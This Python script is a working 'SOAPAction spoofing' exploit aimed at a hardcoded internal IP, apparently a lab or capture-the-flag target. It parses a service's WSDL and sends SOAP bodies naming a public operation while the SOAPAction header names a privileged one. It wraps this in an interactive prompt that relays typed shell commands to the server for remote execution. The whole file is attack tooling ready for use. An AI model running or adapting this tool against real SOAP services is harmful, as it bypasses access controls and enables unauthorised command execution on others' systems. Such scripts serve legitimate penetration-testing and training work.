#!/usr/bin/env python3
"""
SOAPAction Spoofing Exploit
Uses wsdl-parser (installed in /usr/local/bin) to auto-discover operations,
then lets you pick which public operation to tunnel through and which
privileged operation to spoof.
"""

import requests
import subprocess
import re
import sys

# ============================================================================
# CONFIG - change this per target
# ============================================================================

WSDL_URL = "http://10.129.170.188:3002/wsdl?wsdl"

# ============================================================================
# WSDL PARSER INTEGRATION
# ============================================================================

def run_parser(wsdl_url):
    """Run wsdl-parser non-interactively and return its output."""
    print(f"[*] Fetching and parsing WSDL from {wsdl_url}...")
    try:
        parser = subprocess.run(
            ["wsdl-parser", "--no-interactive", wsdl_url],
            capture_output=True,
            text=True
        )
        if parser.returncode != 0:
            print(f"[!] Parser error:\n{parser.stderr}")
            sys.exit(1)
        return parser.stdout
    except FileNotFoundError:
        print("[!] wsdl-parser not found — make sure it's installed in /usr/local/bin")
        sys.exit(1)


def parse_operations(parser_output):
    """
    Pull operation names, element names, SOAPActions, and params
    out of the parser's stdout.

    Returns a dict like:
    {
      "Login": {
          "element":     "LoginRequest",
          "soap_action": "Login",
          "params":      ["username", "password"]
      },
      ...
    }
    """
    operations = {}
    current_op = None

    for line in parser_output.splitlines():
        # Strip ANSI color codes
        clean = re.sub(r'\x1b\[[0-9;]*m', '', line).strip()

        # New operation block  e.g.  "[1] Login"
        m = re.match(r'^\[(\d+)\]\s+(\S+)', clean)
        if m:
            current_op = m.group(2)
            operations[current_op] = {"element": "", "soap_action": "", "params": []}
            continue

        if current_op is None:
            continue

        # Element   : LoginRequest
        m = re.match(r'^Element\s*:\s*(\S+)$', clean)
        if m:
            operations[current_op]["element"] = m.group(1)
            continue

        # SOAPAction: Login
        m = re.match(r'^SOAPAction\s*:\s*(\S+)$', clean)
        if m:
            operations[current_op]["soap_action"] = m.group(1)
            continue

        # Params    : username password
        m = re.match(r'^Params\s*:\s*(.+)$', clean)
        if m:
            params = m.group(1).split()
            if params != ["none"]:
                operations[current_op]["params"] = params
            continue

    return operations


def pick_operation(operations, prompt):
    """Print numbered list and let user pick one."""
    ops = list(operations.keys())
    print(f"\n  {prompt}")
    for i, name in enumerate(ops, 1):
        op = operations[name]
        print(f"  [{i}] {name}  (element: {op['element']}, SOAPAction: {op['soap_action']}, params: {op['params']})")
    while True:
        choice = input("  > ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(ops):
            return ops[int(choice) - 1]
        print("  [!] Invalid choice")


# ============================================================================
# SOAP PAYLOAD BUILDER
# ============================================================================

def build_payload(namespace, public_element, param_name, command):
    """
    Builds the SOAP envelope.
    - Body uses public_element  (the one the server accepts from outside)
    - param_name is whatever the parser found (cmd, username, etc.)
    - SOAPAction header is set separately to the privileged operation
    """
    return (
        f'<?xml version="1.0" encoding="utf-8"?>'
        f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="{namespace}">'
        f'<soap:Body>'
        f'<tns:{public_element}>'
        f'<{param_name}>{command}</{param_name}>'
        f'</tns:{public_element}>'
        f'</soap:Body>'
        f'</soap:Envelope>'
    )


def send_request(endpoint_url, payload, soap_action):
    headers = {"SOAPAction": f'"{soap_action}"'}
    try:
        r = requests.post(endpoint_url, data=payload, headers=headers, timeout=10)
        return r
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")
        return None


# ============================================================================
# MAIN
# ============================================================================

def main():
    print("=" * 70)
    print("SOAPACTION SPOOFING EXPLOIT")
    print("=" * 70)

    # Step 1 — parse the WSDL
    raw_output = run_parser(WSDL_URL)
    operations = parse_operations(raw_output)

    if not operations:
        print("[!] No operations found — check WSDL_URL")
        sys.exit(1)

    print(f"\n[+] Found {len(operations)} operations: {', '.join(operations)}")

    # Step 2 — user picks which operation to use as the public tunnel
    public_op_name = pick_operation(
        operations,
        "Which operation is publicly accessible? (the one the server accepts from outside)"
    )
    public_op = operations[public_op_name]

    # Step 3 — user picks which operation to spoof
    priv_op_name = pick_operation(
        operations,
        "Which operation do you want to SPOOF? (the privileged one you want to execute)"
    )
    priv_op = operations[priv_op_name]

    # Step 4 — pick which param to inject the command into (from the SPOOF op)
    params = priv_op["params"]
    if not params:
        print("[!] Spoof operation has no parameters to inject into")
        sys.exit(1)

    if len(params) == 1:
        inject_param = params[0]
        print(f"\n[*] Injecting into param: {inject_param}")
    else:
        print(f"\n  Which param should carry the command? {params}")
        for i, p in enumerate(params, 1):
            print(f"  [{i}] {p}")
        while True:
            choice = input("  > ").strip()
            if choice.isdigit() and 1 <= int(choice) <= len(params):
                inject_param = params[int(choice) - 1]
                break
            print("  [!] Invalid choice")

    # Derive endpoint URL and namespace from WSDL URL
    endpoint_url = WSDL_URL.split("?")[0]
    namespace    = "http://tempuri.org/"

    print("\n" + "=" * 70)
    print(f"[*] Endpoint      : {endpoint_url}")
    print(f"[*] XML body uses : <{public_op['element']}> with <{inject_param}>")
    print(f"[*] SOAPAction    : {priv_op['soap_action']}  ← the spoof")
    print("=" * 70)
    print("[*] Enter commands to execute (type 'exit' to quit)\n")

    while True:
        try:
            cmd = input("$ ").strip()
            if cmd.lower() in ["exit", "quit", "q"]:
                print("[*] Exiting...")
                break
            if not cmd:
                continue

            payload  = build_payload(namespace, public_op["element"], inject_param, cmd)
            response = send_request(endpoint_url, payload, priv_op["soap_action"])

            if response:
                print(response.content.decode())
                print()

        except KeyboardInterrupt:
            print("\n[*] Interrupted")
            break


if __name__ == "__main__":
    main()
                     
